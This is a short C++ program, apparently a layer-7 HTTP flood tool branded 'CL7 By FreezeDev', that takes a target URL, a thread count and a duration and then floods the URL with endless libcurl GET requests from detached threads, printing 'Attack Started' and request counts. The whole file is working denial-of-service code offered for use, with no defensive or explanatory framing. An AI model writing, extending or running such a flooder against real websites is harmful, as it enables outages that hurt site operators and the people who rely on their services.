#include <stdio.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <curl/curl.h>
#include <thread>
#include <vector>
#include <chrono>
#include <iomanip>

using namespace std;

int sreq = 0;

void cthr(int id, const char* url){

    FILE *devnull = fopen("/dev/null", "w+");
    
    while(true){
        CURL *curl;
        curl = curl_easy_init();
        if(curl){
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, devnull);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_perform(curl);
            sreq += 1;
            curl_easy_cleanup(curl);
        }
    }
}

int main(int argc, char *argv[]){

    if(argc<3+(1)){
        cout << "Excepted arguments" << endl;
        cout << "Arg 1\t\tURL" << endl;
        cout << "Arg 2\t\tTHREADS" << endl;
        cout << "Arg 2\t\tTIME" << endl;
        return(0);
    }

    const char* url = argv[1];
    int n_thread = atoi(argv[2]);
    int time = atoi(argv[3]);

    vector<thread> threads(n_thread);

    for(int i = 0; i < n_thread; i++){
        threads[i] = thread(cthr, i, url);
        threads[i].detach();
    }

    cout << "--------+ CL7 By FreezeDev +--------" << endl;
    cout << "URL:\t\t"<<url<< endl;
    cout << "Threads:\t"<<n_thread<< endl;
    cout << "--------+  Attack Started  +--------" << endl;

    for(int i = 0; i < time; i++){
        cout << "Time remaining: "<<time-i<< "seconds\t" << "Sent requests: " << sreq << endl;
        this_thread::sleep_for(chrono::seconds(1));
    }

    cout << "--------+  Attack Stopped  +--------" << endl;

}
